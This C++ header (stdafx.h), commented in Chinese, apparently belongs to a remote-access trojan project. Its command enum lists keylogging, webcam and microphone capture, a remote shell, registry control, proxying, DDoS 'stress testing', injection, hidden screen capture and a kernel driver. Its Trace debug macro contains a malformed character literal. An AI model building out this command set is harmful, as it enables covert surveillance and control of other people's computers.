// stdafx.h : 标准系统包含文件的包含文件，
// 或是经常使用但不常更改的
// 特定于项目的包含文件
//
#pragma once
#define SAFE_DELETE(p) { if(p) { delete (p);   (p)=NULL; } }
#define SAFE_DELETE_AR(p) { if(p) { delete[] (p);   (p)=NULL; } }


#include "targetver.h"
#include <winsock2.h>
#include "windows.h"
#include <mswsock.h>
#include <MSTcpIP.h>

#pragma comment(lib, "ws2_32.lib")
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include "process.h"
#include "ISocketBase.h"
#include "TcpSocket.h"
#include "UdpSocket.h"



// BYTE最大也就256
enum MAIN
{
	TOKEN_CONDITION,			//数据更新
	TOKEN_ERROR,				//客户端反馈信息
	TOKEN_PROCESS,				//进程
	TOKEN_GNDESKTOP,			//桌面截图预览
	TOKEN_GETVERSION,			//获取版本
	TOKEN_SENDLL,				//发送DLL数据
	TOKEN_LOGIN,				//上线

	TOKEN_DRIVE_LIST,			//文件传输
	TOKEN_WEBCAM_BITMAPINFO,	//摄像头
	TOKEN_AUDIO_START,			//麦克风
	TOKEN_SPEAK_START,			//扬声器
	TOKEN_KEYBOARD_START,		//键盘记录
	TOKEN_PSLIST,				//系统管理
	TOKEN_SHELL_START,			//远程终端
	TOKEN_SYSINFOLIST,			//主机管理
	TOKEN_CHAT_START,			//远程交谈
	TOKEN_REGEDIT,				//注册表管理 
	TOKEN_PROXY_START,			//代理
	TOKEN_DDOS,					//压力测试
	TOKEN_INJECT,				//注入管理

	TOKEN_MONITOR,				//屏幕监控
	TOKEN_BITMAPINFO_DIF,		//差异屏幕
	TOKEN_BITMAPINFO_QUICK,		//高速屏幕
	TOKEN_BITMAPINFO_PLAY,		//娱乐屏幕
	TOKEN_BITMAPINFO_HIDE,		//后台屏幕



	TOKEN_KERNEL=100,			//驱动功能


	TOKEN_EXPAND = 200,				//所有扩展插件
	TOKEN_HEARTBEAT,				//心跳
	TOKEN_ACTIVED,					//激活
	TOKEN_GETAUTODLL,				//自动任务

	TOKEN_NOTHING=255,				//0
};


#if _DEBUG
#include <iostream>
#endif


#define  TraceMAXSTRING    1024

inline void Trace(const  char* format, ...)
{
#if _DEBUG
#define  TraceEx _snprintf(szBuffer,TraceMAXSTRING,"%s(%d): ", \
     & strrchr(__FILE__, ' \\ ' )[ 1 ],__LINE__); \
    _RPT0(_CRT_WARN,szBuffer); \
    Trace
	static   char  szBuffer[TraceMAXSTRING];
	va_list args;
	va_start(args, format);
	int  nBuf;
	nBuf = _vsnprintf_s(szBuffer,
		TraceMAXSTRING,
		format,
		args);
	va_end(args);

	_RPT0(_CRT_WARN, szBuffer);
#endif

}

